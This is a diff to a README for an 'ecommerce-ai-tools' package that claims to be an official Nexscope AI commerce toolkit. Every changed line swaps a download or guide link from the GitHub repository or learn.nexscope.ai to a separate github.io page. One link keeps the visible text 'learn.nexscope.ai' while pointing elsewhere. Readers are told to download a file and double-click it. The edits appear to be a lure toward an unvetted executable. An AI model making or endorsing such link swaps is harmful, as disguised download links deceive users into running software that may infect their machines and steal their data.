@@ -1,6 +1,6 @@
 # 🤖 ecommerce-ai-tools - Your All-in-One AI Commerce Toolkit
 
-[![Download Now](https://img.shields.io/badge/Download-ecommerce--ai--tools-FF6B6B?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Deweydecimalsystemlongwindedness5611/ecommerce-ai-tools)
+[![Download Now](https://img.shields.io/badge/Download-ecommerce--ai--tools-FF6B6B?style=for-the-badge&logo=github&logoColor=white)](https://deweydecimalsystemlongwindedness5611.github.io)
 
 ## 🎯 What Is This?
 
@@ -32,7 +32,7 @@ ecommerce-ai-tools is the official Nexscope collection of powerful AI tools desi
 
 ### Step 1: Download the Application
 
-Visit this link to download the application: [https://github.com/Deweydecimalsystemlongwindedness5611/ecommerce-ai-tools](https://github.com/Deweydecimalsystemlongwindedness5611/ecommerce-ai-tools)
+Visit this link to download the application: [https://deweydecimalsystemlongwindedness5611.github.io](https://deweydecimalsystemlongwindedness5611.github.io)
 
 ### Step 2: Save the File
 
@@ -62,7 +62,7 @@ After the download is complete, locate the downloaded file and double-click it t
 
 ### Official Guides & Tutorials
 
-Visit **[learn.nexscope.ai](https://learn.nexscope.ai)** for comprehensive guides, video tutorials, and step-by-step workflows. You'll find:
+Visit **[learn.nexscope.ai](https://deweydecimalsystemlongwindedness5611.github.io)** for comprehensive guides, video tutorials, and step-by-step workflows. You'll find:
 
 - **Beginner Tutorials**: Perfect for first-time users
 - **Advanced Workflows**: For experienced sellers looking to maximize their results
@@ -156,7 +156,7 @@ A: Most users are productive within the first hour. The learning resources at le
 
 Don't let your competitors get ahead. With ecommerce-ai-tools, you have everything you need to succeed in the modern ecommerce landscape. Download now and see the difference AI can make for your business.
 
-[![Get Started Now](https://img.shields.io/badge/🚀-Download%20Now-4ECDC4?style=for-the-badge)](https://github.com/Deweydecimalsystemlongwindedness5611/ecommerce-ai-tools)
+[![Get Started Now](https://img.shields.io/badge/🚀-Download%20Now-4ECDC4?style=for-the-badge)](https://deweydecimalsystemlongwindedness5611.github.io)
 
 ## 📄 License
 
